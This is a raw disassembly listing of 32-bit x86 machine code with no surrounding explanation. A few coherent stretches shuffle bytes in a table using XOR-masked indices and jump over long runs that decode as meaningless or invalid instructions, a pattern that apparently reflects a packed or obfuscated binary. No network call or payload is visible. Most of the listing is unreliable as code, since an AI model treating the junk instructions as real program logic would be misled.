  404a8c:	mov    gs,WORD PTR [ebx+0x30]
  404a8f:	sbb    BYTE PTR [ecx+0xf],ah
  404a92:	mov    dh,0xac
  404a94:	in     al,dx
  404a95:	stos   BYTE PTR es:[edi],al
  404a96:	mov    al,ds:0xa4dfafd4
  404a9b:	repnz shl BYTE PTR [esi+eiz*4],1
  404a9f:	jns    0x404a4b
  404aa1:	mov    esp,0xadb8979e
  404aa6:	mov    DWORD PTR [ebp-0xc],0xf89c8532
  404aad:	mov    DWORD PTR [ebp-0x44],0xf89c8533
  404ab4:	mov    edx,DWORD PTR [ebp-0x18]
  404ab7:	xor    edx,eax
  404ab9:	add    edx,ecx
  404abb:	jmp    0x404e2b
  404ac0:	mov    edx,DWORD PTR [ebp-0x18]
  404ac3:	xor    edx,eax
  404ac5:	add    edx,DWORD PTR [ebp-0x14]
  404ac8:	mov    edi,DWORD PTR [ebp-0x1c]
  404acb:	mov    dl,BYTE PTR [edx+edi*1+0x32729b]
  404ad2:	mov    BYTE PTR [ebp+0xf],dl
  404ad5:	mov    edx,DWORD PTR [ebp-0xc]
  404ad8:	xor    edx,eax
  404ada:	add    edx,DWORD PTR [ebp-0x14]
  404add:	mov    edi,DWORD PTR [ebp-0x1c]
  404ae0:	mov    dl,BYTE PTR [edx+edi*1+0x32729b]
  404ae7:	mov    BYTE PTR [ebp+0xb],dl
  404aea:	mov    dl,BYTE PTR [ebp+0xf]
  404aed:	mov    edi,DWORD PTR [ebp-0xc]
  404af0:	xor    edi,eax
  404af2:	add    edi,DWORD PTR [ebp-0x14]
  404af5:	mov    ebx,DWORD PTR [ebp-0x1c]
  404af8:	mov    BYTE PTR [edi+ebx*1+0x32729b],dl
  404aff:	mov    dl,BYTE PTR [ebp+0xb]
  404b02:	mov    edi,DWORD PTR [ebp-0x18]
  404b05:	xor    edi,eax
  404b07:	add    edi,DWORD PTR [ebp-0x14]
  404b0a:	mov    ebx,DWORD PTR [ebp-0x1c]
  404b0d:	mov    BYTE PTR [edi+ebx*1+0x32729b],dl
  404b14:	mov    edx,DWORD PTR [ebp-0x44]
  404b17:	mov    edi,DWORD PTR [ebp-0xc]
  404b1a:	xor    edx,eax
  404b1c:	xor    edi,eax
  404b1e:	add    edx,ecx
  404b20:	jmp    0x404e23
  404b25:	xor    ebx,esi
  404b27:	adc    edx,ebp
  404b29:	shl    ebp,1
  404b2b:	icebp  
  404b2c:	repz xor eax,0x6f3c6a28
  404b32:	cs push 0x7e22a23f
  404b38:	jle    0x404b92
  404b3a:	jl     0x404bba
  404b3c:	jle    0x404b5a
  404b3e:	stos   BYTE PTR es:[edi],al
  404b3f:	test   ch,bl
  404b41:	push   ss
  404b42:	push   ebx
  404b43:	dec    edi
  404b44:	mov    eax,ds:0x695da435
  404b49:	int3   
  404b4a:	jmp    0x404b7c
  404b4c:	mov    ebp,0xe30fbd9a
  404b51:	ret    0xcb4
  404b54:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404b55:	pop    eax
  404b56:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404b57:	sub    ah,bl
  404b59:	clc    
  404b5a:	ds mov dh,0xdb
  404b5d:	stos   BYTE PTR es:[edi],al
  404b5e:	xchg   ebx,eax
  404b5f:	jp     0x404b65
  404b61:	sbb    BYTE PTR [edx+eiz*2+0x6],al
  404b65:	lods   al,BYTE PTR ds:[esi]
  404b66:	push   esi
  404b67:	outs   dx,DWORD PTR ds:[esi]
  404b68:	adc    al,BYTE PTR [esi-0x14afdda2]
  404b6e:	test   eax,0xd8b3b4ad
  404b73:	pop    esp
  404b74:	(bad)  
  404b75:	in     al,0x26
  404b77:	std    
  404b78:	inc    edi
  404b79:	cmp    eax,DWORD PTR [edx-0x16]
  404b7c:	jns    0x404bc9
  404b7e:	cmp    bh,BYTE PTR [ebx]
  404b80:	std    
  404b81:	or     DWORD PTR [edx-0x2fc8e91b],ebx
  404b87:	popf   
  404b88:	out    dx,eax
  404b89:	mov    ebx,0xfb9d5b4e
  404b8e:	sahf   
  404b8f:	jecxz  0x404bb5
  404b91:	es pop ss
  404b93:	cmp    cl,BYTE PTR [edi-0x4e0a9a17]
  404b99:	mov    ss,WORD PTR [edi]
  404b9b:	push   ecx
  404b9c:	popa   
  404b9d:	aam    0xf4
  404b9f:	out    0x6b,al
  404ba1:	leave  
  404ba2:	pop    ss
  404ba3:	jge    0x404bd7
  404ba5:	ins    BYTE PTR es:[edi],dx
  404ba6:	sbb    BYTE PTR [eax-0x7],0xcf
  404baa:	ins    BYTE PTR es:[edi],dx
  404bab:	aas    
  404bac:	pop    edx
  404bad:	jae    0x404b9f
  404baf:	and    ebx,edx
  404bb1:	sbb    ch,BYTE PTR [ebx]
  404bb3:	sub    BYTE PTR [edx],cl
  404bb5:	xor    eax,0x685971b2
  404bba:	jg     0x404b81
  404bbc:	popf   
  404bbd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404bbe:	xchg   ebp,eax
  404bbf:	out    dx,al
  404bc0:	retf   
  404bc1:	cmp    ecx,DWORD PTR [esi-0x1fdbd88f]
  404bc7:	sar    BYTE PTR [edx-0x1a7710e1],0x9a
  404bce:	add    DWORD PTR fs:[ebp+0x5cbe8336],ecx
  404bd5:	adc    al,BYTE PTR [edi+0x5b]
  404bd8:	add    DWORD PTR [eax+0x20],ecx
  404bdb:	or     eax,ecx
  404bdd:	pop    esp
  404bde:	call   0xbc2f5b9d
  404be3:	jne    0x404bd0
  404be5:	pop    ecx
  404be6:	jge    0x404c3a
  404be8:	jg     0x404bd6
  404bea:	cmc    
  404beb:	aad    0xf8
  404bed:	stc    
  404bee:	loop   0x404be0
  404bf0:	rol    ch,0x39
  404bf3:	add    eax,0x90f4ab6b
  404bf8:	and    ebp,DWORD PTR [edi+eax*2-0x77]
  404bfc:	lods   al,BYTE PTR ds:[esi]
  404bfd:	jmp    0x28cfe7cf
  404c02:	mov    eax,ds:0x8efd29ad
  404c07:	jne    0x404c3e
  404c09:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404c0a:	das    
  404c0b:	(bad)  
  404c0c:	jmp    0xcdf8aaae
  404c11:	and    ebx,DWORD PTR [eax+edx*2-0xe]
  404c15:	xchg   ebp,eax
  404c16:	ins    BYTE PTR es:[edi],dx
  404c17:	fadd   DWORD PTR [edi-0x28f56cd]
  404c1d:	xchg   edx,eax
  404c1e:	sub    WORD PTR [eax-0x8],sp
  404c22:	xchg   BYTE PTR [esi+0x7e7d8583],ch
  404c28:	push   es
  404c29:	aam    0x7b
  404c2b:	xor    BYTE PTR [edi+0xffc3642],dh
  404c31:	mov    ds:0xc9784e7c,al
  404c36:	sub    BYTE PTR [esi+0x5d],cl
  404c39:	stc    
  404c3a:	popf   
  404c3b:	xor    ch,BYTE PTR [esp+ecx*2+0x0]
  404c3f:	sbb    al,0xfc
  404c41:	ds daa 
  404c43:	mov    ds:0x42599abe,eax
  404c48:	sbb    DWORD PTR [ecx-0xf],eax
  404c4b:	popa   
  404c4c:	cmp    BYTE PTR [ecx],dl
  404c4e:	aas    
  404c4f:	out    0xd5,al
  404c51:	test   DWORD PTR [esi],edi
  404c53:	mov    ebp,0xee883e2
  404c58:	aas    
  404c59:	sub    bl,dh
  404c5b:	xor    dl,BYTE PTR [esi-0x80]
  404c5e:	cmc    
  404c5f:	xchg   BYTE PTR [eax],bh
  404c61:	(bad)  
  404c62:	jecxz  0x404c8a
  404c64:	adc    ch,ah
  404c66:	cs pop ebx
  404c68:	lods   al,BYTE PTR ds:[esi]
  404c69:	sar    DWORD PTR [edx],1
  404c6b:	dec    esp
  404c6c:	ret    0x4eda
  404c6f:	xor    dl,cl
  404c71:	ror    BYTE PTR [eax],cl
  404c73:	sbb    DWORD PTR [edi],edi
  404c75:	jmp    0x575f4fac
  404c7a:	cdq    
  404c7b:	push   ebx
  404c7c:	lods   eax,DWORD PTR ds:[esi]
  404c7d:	sbb    BYTE PTR [esi+edi*8],dl
  404c80:	icebp  
  404c81:	push   cs
  404c82:	inc    ebp
  404c83:	xchg   ebx,eax
  404c84:	les    ebp,FWORD PTR [eax+edi*2+0x4f]
  404c88:	stc    
  404c89:	jle    0x404cc7
  404c8b:	js     0x404ca0
  404c8d:	xchg   ebp,eax
  404c8e:	js     0x404c33
  404c90:	loopne 0x404c84
  404c92:	fist   DWORD PTR [ebx+ecx*2-0x4c5fef95]
  404c99:	fisubr WORD PTR [edi+0x5556f34c]
  404c9f:	adc    BYTE PTR [edi],0x78
  404ca2:	add    bl,BYTE PTR [esi+edx*4+0x7e]
  404ca6:	popa   
  404ca7:	into   
  404ca8:	or     BYTE PTR [edi+0x7d595211],bl
  404cae:	popa   
  404caf:	jecxz  0x404cc1
  404cb1:	adc    al,0x2
  404cb3:	icebp  
  404cb4:	mov    ds:0x6cb347db,eax
  404cb9:	sbb    ch,BYTE PTR [ebp+edx*2+0x3bfe9a5b]
  404cc0:	xor    BYTE PTR [ebp+0x79cee51f],bh
  404cc6:	sub    BYTE PTR [esi],ch
  404cc8:	jg     0x404ca5
  404cca:	dec    eax
  404ccb:	xchg   ebx,eax
  404ccc:	icebp  
  404ccd:	xchg   edi,eax
  404cce:	scas   al,BYTE PTR es:[edi]
  404ccf:	push   cs
  404cd0:	jmp    0x3cc5:0x95e33095
  404cd7:	(bad)  
  404cd8:	sbb    DWORD PTR [edx-0x7d0974d2],esi
  404cde:	dec    esi
  404cdf:	lods   al,BYTE PTR ds:[esi]
  404ce0:	add    DWORD PTR [ecx+0x2c],0xec7a09d7
  404ce7:	out    0x33,al
  404ce9:	jl     0x404d0b
  404ceb:	sub    bl,BYTE PTR [esi-0x75]
  404cee:	je     0x404c88
  404cf0:	ins    DWORD PTR es:[edi],dx
  404cf1:	ds mov dh,cl
  404cf4:	ins    DWORD PTR es:[edi],dx
  404cf5:	cs (bad) 
  404cf7:	leave  
  404cf8:	xor    DWORD PTR [ebx+0x316b7b07],eax
  404cfe:	lods   al,BYTE PTR ds:[esi]
  404cff:	or     eax,0x9d4605cb
  404d04:	sub    esp,DWORD PTR [ecx]
  404d06:	mov    ch,BYTE PTR [edi+edi*2+0x4a9e38b6]
  404d0d:	int    0x3a
  404d0f:	fsub   st,st(3)
  404d11:	mov    edi,0x7a8013fe
  404d16:	fistp  WORD PTR [ebx+0x50]
  404d19:	jne    0x404cd1
  404d1b:	out    dx,eax
  404d1c:	sub    ebp,DWORD PTR [ebx+0x7f9bc151]
  404d22:	push   cs
  404d23:	shr    DWORD PTR cs:[edx+0x3f],cl
  404d27:	ds fwait
  404d29:	mov    esi,0xd3d31268
  404d2e:	adc    eax,eax
  404d30:	pushf  
  404d31:	mov    eax,es
  404d33:	hlt    
  404d34:	dec    esp
  404d35:	mov    ds:0x40528221,eax
  404d3a:	inc    ecx
  404d3b:	out    0x1d,eax
  404d3d:	fxch   st(0)
  404d3f:	in     eax,0xc
  404d41:	inc    edi
  404d42:	cmp    BYTE PTR fs:[edx-0x2f6920a4],cl
  404d49:	xor    eax,0x63caa82
  404d4e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404d4f:	ret    0x2c99
  404d52:	ins    BYTE PTR es:[edi],dx
  404d53:	mov    ds:0x9046c5d9,eax
  404d58:	jp     0x404d43
  404d5a:	sub    cl,bh
  404d5c:	dec    ebx
  404d5d:	es push edx
  404d5f:	xchg   dh,dl
  404d61:	test   DWORD PTR [edi],ecx
  404d63:	mov    DWORD PTR [ecx],ecx
  404d65:	sub    eax,0xd9bb4499
  404d6a:	push   ebx
  404d6b:	in     al,dx
  404d6c:	mov    al,ds:0x73d44b28
  404d71:	and    ebx,edi
  404d73:	add    BYTE PTR [ebp+0x44],bh
  404d76:	pop    esp
  404d77:	lahf   
  404d78:	inc    edx
  404d79:	rol    eax,1
  404d7b:	xchg   ebp,eax
  404d7c:	push   ebx
  404d7d:	fimul  DWORD PTR [edi+0x70]
  404d80:	in     al,0x4c
  404d82:	mov    esp,0xfe2b9e35
  404d87:	jge    0x404d8e
  404d89:	cmp    ebx,ebx
  404d8b:	sbb    esp,0x9b2f409c
  404d91:	iret   
  404d92:	je     0x404d66
  404d94:	mov    dh,BYTE PTR [ebx-0x488f6885]
  404d9a:	repz mov edx,0xb61b3df
  404da0:	cdq    
  404da1:	retf   0x173b
  404da4:	sar    BYTE PTR [ecx+0x9],0x8e
  404da8:	jp     0x404db1
  404daa:	stc    
  404dab:	sti    
  404dac:	lds    ebx,FWORD PTR [edi+ecx*1]
  404daf:	xchg   esp,eax
  404db0:	and    DWORD PTR [ecx],ebp
  404db2:	loopne 0x404e1e
  404db4:	shl    DWORD PTR [edx+0x3ffaf973],1
  404dba:	dec    ebx
  404dbb:	out    0x18,al
  404dbd:	push   DWORD PTR [esi-0x7f]
  404dc0:	mov    ebx,0xe2615a10
  404dc5:	jnp    0x404dd2
  404dc7:	cmp    al,0x26
  404dc9:	jp     0x404dc4
  404dcb:	mov    DWORD PTR [ebx*2+0x7cde6dea],eax
  404dd2:	out    dx,al
  404dd3:	mov    al,ds:0xba13db23
  404dd8:	leave  
  404dd9:	inc    edx
  404dda:	(bad)  
  404ddb:	or     al,0x29
  404ddd:	fnstenv [esi]
  404ddf:	add    al,0xa2
  404de1:	cwde   
  404de2:	(bad)  
  404de3:	iret   
  404de4:	mov    cl,0xd1
  404de6:	cs sti 
  404de8:	jp     0x404dc5
  404dea:	xchg   DWORD PTR [ecx],edi
  404dec:	xor    DWORD PTR [edi],edi
  404dee:	dec    esp
  404def:	test   eax,0xda3ef686
  404df4:	pop    ecx
  404df5:	shl    esi,cl
  404df7:	jnp    0x404dc7
  404df9:	sub    al,0x9f
  404dfb:	mov    al,0x9a
  404dfd:	add    cl,ah
  404dff:	ds aam 0x34
  404e02:	pop    edi
  404e03:	add    al,0xe3
  404e05:	add    DWORD PTR [eax+0x39],edx
  404e08:	(bad)  
  404e09:	jmp    0x2585:0xdfafd9c5
  404e10:	pop    ecx
  404e11:	rol    BYTE PTR [edx+ebx*1],0x61
  404e15:	in     al,dx
  404e16:	jo     0x404dad
  404e18:	gs cli 
  404e1a:	jmp    0x3174567b
  404e1f:	(bad)  
  404e20:	sbb    al,0x78
  404e22:	stos   BYTE PTR es:[edi],al
  404e23:	add    edi,ecx
  404e25:	imul   edx,edi
  404e28:	add    edx,DWORD PTR [ebp-0x14]
  404e2b:	mov    DWORD PTR [ebp-0x14],edx
  404e2e:	mov    edx,DWORD PTR [ebp-0xc]
  404e31:	mov    edi,DWORD PTR [ebp-0x24]
  404e34:	xor    edx,eax
  404e36:	add    edx,ecx
  404e38:	imul   edx,edi
  404e3b:	mov    edi,DWORD PTR [ebp-0xc]
  404e3e:	xor    edi,eax
  404e40:	sub    edx,edi
  404e42:	mov    edi,DWORD PTR [ebp-0xc]
  404e45:	mov    ebx,DWORD PTR [ebp-0x14]
  404e48:	xor    edi,eax
  404e4a:	add    edi,ecx
  404e4c:	jmp    0x40514f
  404e51:	xlat   BYTE PTR ds:[ebx]
  404e52:	pop    eax
  404e53:	mov    ds:0x51e5b1dc,eax
  404e58:	jno    0x404e33
  404e5a:	stc    
  404e5b:	hlt    
  404e5c:	jb     0x404eba
  404e5e:	mov    WORD PTR [eax+0x7e218c7a],ss
  404e64:	jle    0x404ebe
  404e66:	jl     0x404ee6
  404e68:	jle    0x404ec2
  404e6a:	cdq    
  404e6b:	sub    eax,0x945803ed
  404e70:	jb     0x404e32
  404e72:	sbb    DWORD PTR [ebx],ebx
  404e74:	js     0x404e9d
  404e76:	push   ss
  404e77:	push   0x168c95a2
  404e7c:	adc    BYTE PTR [esi+esi*8],cl
  404e7f:	pop    edx
  404e80:	mov    ch,0xd5
  404e82:	sahf   
  404e83:	(bad)  
  404e84:	adc    eax,0x166ec66d
  404e89:	in     al,dx
  404e8a:	mov    BYTE PTR [esi],dh
  404e8c:	lods   al,BYTE PTR ds:[esi]
  404e8d:	(bad)  
  404e8f:	mov    bl,0x8d
  404e91:	cli    
  404e92:	and    al,BYTE PTR [ebx-0x29]
  404e95:	push   cs
  404e96:	jg     0x404e85
  404e98:	mov    cl,0xa9
  404e9a:	and    bl,bh
  404e9c:	idiv   DWORD PTR [edi-0x61]
  404e9f:	mov    esp,0x3f2f7ec2
  404ea4:	xchg   esi,eax
  404ea5:	cdq    
  404ea6:	xchg   edx,eax
  404ea7:	mov    al,ds:0x8fbf7ff7
  404eac:	(bad)
  404eb1:	push   edx
  404eb2:	mov    cl,0xd0
  404eb4:	sub    eax,esi
  404eb6:	call   0xde8c:0x90c9e742
  404ebd:	call   0xfd19:0x8e648f74
  404ec4:	cmc    
  404ec5:	pop    ss
  404ec6:	pop    esi
  404ec7:	inc    edx
  404ec8:	inc    esp
  404ec9:	popf   
  404eca:	adc    cl,BYTE PTR [eax-0x29]
  404ecd:	lods   eax,DWORD PTR ds:[esi]
  404ece:	push   edx
  404ecf:	(bad)  
  404ed1:	loopne 0x404e9b
  404ed3:	or     al,0x21
  404ed5:	or     DWORD PTR [esp+edx*1+0x72],0x3d295236
  404edd:	mov    edi,0x74f493d3
  404ee2:	jg     0x404f3c
  404ee4:	and    al,0xf7
  404ee6:	imul   ebp,DWORD PTR [edi+0x9],0xcbe13cba
  404eed:	adc    DWORD PTR [esp+ebx*1],0x5a00d564
  404ef4:	hlt    
  404ef5:	pushf  
  404ef6:	std    
  404ef7:	push   ebp
  404ef8:	inc    eax
  404ef9:	mov    eax,ds:0x2c62e22f
  404efe:	out    0x22,al
  404f00:	es pop ss
  404f02:	es pop edx
  404f04:	inc    ecx
  404f05:	(bad)  
  404f06:	adc    ebx,DWORD PTR [esi]
  404f08:	arpl   si,ax
  404f0a:	(bad)  
  404f0b:	cmc    
  404f0c:	(bad)  
  404f0d:	xor    cl,bl
  404f0f:	mov    ch,0xe3
  404f11:	shl    edx,1
  404f13:	xchg   esi,eax
  404f14:	adc    ebp,DWORD PTR [esi+0x72085b98]
  404f1a:	cmp    dl,0xab
  404f1d:	(bad)  
  404f1f:	popf   
  404f20:	shl    DWORD PTR [edx-0x3622d8f8],cl
  404f26:	mov    esi,0x5451c070
  404f2b:	int3   
  404f2c:	retf   
  404f2d:	(bad)  
  404f2e:	in     al,0xa7
  404f30:	(bad)  
  404f31:	jg     0x404f6e
  404f33:	sub    BYTE PTR [ebx+0x5ccc9478],cl
  404f39:	test   BYTE PTR [ecx+0x45494fac],dl
  404f3f:	nop
  404f40:	dec    ebp
  404f41:	add    BYTE PTR [edx+0x3a639722],ah
  404f47:	and    eax,DWORD PTR [ebx]
  404f49:	mov    esi,0xe4fc15df
  404f4e:	adc    BYTE PTR [esi-0x8bd8e6],cl
  404f54:	add    esi,DWORD PTR [ebx+edx*4]
  404f57:	repz fcomp DWORD PTR [ebp-0x6e]
  404f5b:	xchg   ebp,eax
  404f5c:	xchg   edx,eax
  404f5d:	fisubr WORD PTR [ecx]
  404f5f:	je     0x404f9b
  404f61:	test   eax,0x710a78fc
  404f66:	sbb    al,0x31
  404f68:	xor    al,BYTE PTR [edi-0x34f2b778]
  404f6e:	enter  0xbebf,0xd9
  404f72:	mov    edx,0xeba6051a
  404f77:	stos   BYTE PTR es:[edi],al
  404f78:	push   0x7a
  404f7a:	nop
  404f7b:	dec    ebp
  404f7c:	repz jo 0x404f52
  404f7f:	outs   dx,DWORD PTR ds:[esi]
  404f80:	out    dx,eax
  404f81:	repz add al,0xfa
  404f84:	fldcw  WORD PTR [edx+0x6e]
  404f87:	(bad)  
  404f88:	cli    
  404f89:	pop    ebp
  404f8a:	ss out dx,al
  404f8c:	sti    
  404f8d:	cmp    bh,BYTE PTR [ebp+0x77]
  404f90:	and    dl,BYTE PTR [ebx]
  404f92:	aaa    
  404f93:	mov    esi,0x3cb2a015
  404f98:	pop    ebx
  404f99:	or     eax,ebx
  404f9b:	loope  0x404f36
  404f9d:	xchg   edx,eax
  404f9e:	mov    bl,0xd6
  404fa0:	aam    0xef
  404fa2:	dec    esp
  404fa3:	xchg   esp,eax
  404fa4:	pop    esi
  404fa5:	in     eax,dx
  404fa6:	sbb    al,0x4c
  404fa8:	ror    DWORD PTR [ecx+esi*2],1
  404fab:	inc    edi
  404fac:	lahf   
  404fad:	sar    DWORD PTR [ebx],0x38
  404fb0:	fldcw  WORD PTR [eax+0xc31f369]
  404fb6:	lods   eax,DWORD PTR ds:[esi]
  404fb7:	adc    edx,ebp
  404fb9:	int3   
  404fba:	seto   cl
  404fbd:	push   edx
  404fbe:	loope  0x404fad
  404fc0:	bnd ja 0x40503b
  404fc3:	or     bh,dh
  404fc5:	dec    BYTE PTR [ebp+esi*1+0x4c86307b]
  404fcc:	xor    DWORD PTR [ecx],esp
  404fce:	test   eax,0xfbd2f805
  404fd3:	dec    edi
  404fd4:	je     0x40504d
  404fd6:	cmp    DWORD PTR [edx],ebp
  404fd8:	sbb    esi,DWORD PTR [eax-0x2f48f895]
  404fde:	xlat   BYTE PTR ds:[ebx]
  404fdf:	xchg   ebx,eax
  404fe0:	jae    0x40504f
  404fe2:	fimul  WORD PTR cs:[ebp+0x70351132]
  404fe9:	xor    BYTE PTR [ecx],bh
  404feb:	sub    ch,al
  404fed:	retf   0x8595
  404ff0:	mov    cl,0x1c
  404ff2:	shl    eax,0x59
  404ff5:	add    al,0x60
  404ff7:	xchg   esp,eax
  404ff8:	leave  
  404ff9:	mov    esi,0xd55758e7
  404ffe:	gs adc al,0xe1
  405001:	int3   
  405002:	adc    ecx,DWORD PTR [esi]
  405004:	push   ss
  405005:	xchg   ebx,eax
  405006:	push   cs
  405007:	in     al,dx
  405008:	fidivr DWORD PTR [edx+0x3c]
  40500b:	fstp   TBYTE PTR [eax-0x30]
  40500e:	inc    edi
  40500f:	(bad)  
  405010:	mov    ds:0xe2badbd8,eax
  405015:	ja     0x405049
  405017:	retf   0x6b18
  40501a:	mov    ds:0xa3de2019,eax
  40501f:	pop    edx
  405020:	add    eax,0x16e50786
  405025:	xor    DWORD PTR [ecx],esp
  405027:	outs   dx,BYTE PTR ds:[esi]
  405028:	pop    esp
  405029:	mov    ss,WORD PTR [esi+edx*1+0xf]
  40502d:	je     0x40505e
  40502f:	hlt    
  405030:	shl    BYTE PTR [edi],0x5d
  405033:	stos   BYTE PTR es:[edi],al
  405034:	xchg   ebx,eax
  405035:	xor    ebp,DWORD PTR [esp+ebx*2]
  405038:	enter  0xba7,0xc9
  40503c:	push   cs
  40503d:	call   0x9e3b:0xda46e1c4
  405044:	pop    ds
  405045:	idiv   DWORD PTR [eax-0x2fcf2195]
  40504b:	xchg   esi,eax
  40504c:	imul   edi,DWORD PTR [ecx],0x17
  40504f:	push   ecx
  405050:	jno    0x40507c
  405052:	outs   dx,BYTE PTR ds:[esi]
  405053:	cwde   
  405054:	push   ss
  405055:	jbe    0x405015
  405057:	out    0x43,al
  405059:	dec    esp
  40505a:	pop    es
  40505b:	dec    edx
  40505c:	and    esp,edx
  40505e:	pop    esi
  40505f:	(bad)  
  405060:	mov    bl,0xd9
  405062:	loopne 0x405001
  405064:	xchg   ebx,eax
  405065:	sub    edi,esp
  405067:	cmc    
  405068:	adc    cl,BYTE PTR [eax+0x3292ec18]
  40506e:	adc    DWORD PTR [ebx+0x529860c9],0xffffffbb
  405075:	imul   ebx,DWORD PTR [ecx],0x4916bd91
  40507b:	or     al,0xc8
  40507d:	push   ss
  40507e:	stos   BYTE PTR es:[edi],al
  40507f:	imul   ebp,DWORD PTR [edx-0x4a],0x31b71b49
  405086:	jge    0x405101
  405088:	jbe    0x40506f
  40508a:	call   0x6ba2322b
  40508f:	push   edi
  405090:	(bad)  
  405091:	mov    edi,0x6c4f6886
  405096:	(bad)  
  405098:	mov    ebp,0x6e719fe3
  40509d:	shl    BYTE PTR [edi-0x4528feeb],1
  4050a3:	in     eax,0x7f
  4050a5:	push   ebx
  4050a6:	add    eax,DWORD PTR [esp+ebx*4-0x1977eadb]
  4050ad:	lds    edx,FWORD PTR [eax]
  4050af:	pop    ecx
  4050b0:	test   DWORD PTR [ecx],ebp
  4050b2:	int    0xae
  4050b4:	arpl   WORD PTR [eax+0x40e16f09],sp
  4050ba:	ret    
  4050bb:	cmc    
  4050bc:	add    al,0x4
  4050be:	cmp    ebx,ebx
  4050c0:	adc    ecx,esp
  4050c2:	test   al,0x4a
  4050c4:	xchg   ebp,eax
  4050c5:	lds    edi,FWORD PTR [edi-0x50528159]
  4050cb:	push   edi
  4050cc:	jns    0x405059
  4050ce:	inc    ecx
  4050cf:	sahf   
  4050d0:	push   es
  4050d1:	xchg   edi,eax
  4050d2:	lds    edi,FWORD PTR [ebx-0x7052f77b]
  4050d8:	xchg   DWORD PTR [ebx+edi*1-0x57089793],ebx
  4050df:	lahf   
  4050e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4050e1:	hlt    
  4050e2:	js     0x40507f
  4050e4:	push   ss
  4050e5:	push   cs
  4050e6:	lock cmp DWORD PTR [edi-0x3629fa6],esi
  4050ed:	pop    eax
  4050ee:	or     eax,DWORD PTR [ecx+edi*2+0x62e63d85]
  4050f5:	jo     0x405111
  4050f7:	ins    BYTE PTR es:[edi],dx
  4050f8:	sub    BYTE PTR [esi-0x5a4cf604],dl
  4050fe:	push   ebx
  4050ff:	hlt    
  405100:	add    BYTE PTR [edi-0x71],ah
  405103:	add    DWORD PTR [ecx-0x6e4c233],ecx
  405109:	aaa    
  40510a:	aad    0x98
  40510c:	add    al,0xf2
  40510e:	call   FWORD PTR [edx]
  405110:	int    0xe7
  405112:	in     al,0x13
  405114:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405115:	(bad)  
  405116:	fcom   QWORD PTR [ebx+0x6bc3d4af]
  40511c:	or     ecx,DWORD PTR [edx*2+0x24d867c3]
  405123:	mov    bh,0xf0
  405125:	aaa    
  405126:	outs   dx,DWORD PTR ds:[esi]
  405127:	ss xchg ecx,eax
  405129:	add    ebx,eax
  40512b:	hlt    
  40512c:	inc    esp
  40512d:	data16 fbstp TBYTE PTR [edi]
  405130:	adc    BYTE PTR [ecx+0x23],cl
  405133:	jecxz  0x4050d6
  405135:	adc    BYTE PTR ds:0x3e88245f,ah
  40513b:	cld    
  40513c:	cdq    
  40513d:	and    esp,DWORD PTR [ecx+0x25]
  405140:	jle    0x40516e
  405142:	rcl    BYTE PTR [ebp+0x1c],0x72
  405146:	test   al,0xb7
  405148:	out    0xea,al
  40514a:	in     ax,0x9b
  40514d:	inc    ebx
  40514e:	mov    ebx,0x8bfbaf0f
  405153:	pop    ebp
  405154:	call   0xd16c298c
  405159:	lea    edi,[edi+ebx*1+0x32729b]
  405160:	jmp    0x405463
  405165:	pusha  
  405166:	das    
  405167:	sti    
  405168:	pop    eax
  405169:	push   ecx
  40516a:	push   0x65ca3761
  40516f:	out    0x76,eax
  405171:	loopne 0x405102
  405173:	mov    dh,0x4a
  405175:	imul   BYTE PTR [esi+edi*2]
  405178:	jle    0x4051d2
  40517a:	jl     0x4051fa
  40517c:	jle    0x40512c
  40517e:	repnz iret 
  405180:	mov    esi,?
  405182:	mov    ecx,DWORD PTR [edx-0x65]
  405185:	inc    ebp
  405186:	sbb    al,0x4a
  405188:	push   ss
  405189:	add    DWORD PTR [eax],eax
  40518b:	jg     0x40519a
  40518d:	dec    esp
  40518e:	out    dx,al
  40518f:	inc    ecx
  405190:	add    esp,DWORD PTR cs:[eax+0x4a]
  405194:	pop    ebp
  405195:	jp     0x405172
  405197:	out    dx,al
  405198:	jae    0x4051dc
  40519a:	and    DWORD PTR [edi-0x3b747fb8],edx
  4051a0:	lds    edi,FWORD PTR [ebx-0x22]
  4051a3:	cmp    DWORD PTR [ebx-0x20],eax
  4051a6:	push   eax
  4051a7:	adc    DWORD PTR [ecx+0x31cf345e],0xfffffffc
  4051ae:	sbb    DWORD PTR [esp+edi*8],eax
  4051b1:	rol    ch,1
  4051b3:	mov    ds:0xf4a236f1,ax
  4051b9:	(bad)  
  4051ba:	stos   BYTE PTR es:[edi],al
  4051bb:	xchg   ebx,eax
  4051bc:	fwait
  4051bd:	mov    ecx,0x1fc9118
  4051c2:	js     0x4051b6
  4051c4:	jbe    0x40519d
  4051c6:	push   0x40
  4051c8:	add    BYTE PTR [edx+0xf],0xb0
  4051cc:	mov    ebx,ebp
  4051ce:	xchg   edi,eax
  4051cf:	pop    esp
  4051d0:	and    dh,BYTE PTR [eax-0x71]
  4051d3:	and    DWORD PTR [esi-0x50],edi
  4051d6:	jmp    FWORD PTR [edx-0x39d4e96b]
  4051dc:	ins    BYTE PTR es:[edi],dx
  4051dd:	mov    DWORD PTR [esi+edi*2],ebp
  4051e0:	xlat   BYTE PTR ds:[ebx]
  4051e1:	cmp    BYTE PTR [ecx-0x24],cl
  4051e4:	and    esi,eax
  4051e6:	mov    es,WORD PTR [edi]
  4051e8:	sub    edx,DWORD PTR [ecx-0x3b0d345d]
  4051ee:	cs lock mov edi,0xd8d2a7d2
  4051f5:	repz sar BYTE PTR [esi+0x781cab41],cl
  4051fc:	pop    ss
  4051fd:	ss scas al,BYTE PTR es:[edi]
  4051ff:	out    0x6a,al
  405201:	aas    
  405202:	push   0x63
  405204:	aas    
  405205:	push   esp
  405206:	xor    al,0x70
  405208:	adc    edx,0x8742f61c
  40520e:	cmp    eax,0x502fb071
  405213:	dec    edi
  405214:	jae    0x4051f8
  405216:	pop    ds
  405217:	data16 fadd DWORD PTR [ebp-0x5f]
  40521b:	pop    eax
  40521c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40521d:	xor    ecx,DWORD PTR [eax+0x25515432]
  405223:	loope  0x405222
  405225:	or     eax,0xfacbd87d
  40522a:	sbb    dl,BYTE PTR [edx]
  40522c:	imul   ebx,DWORD PTR [eax],0x5a
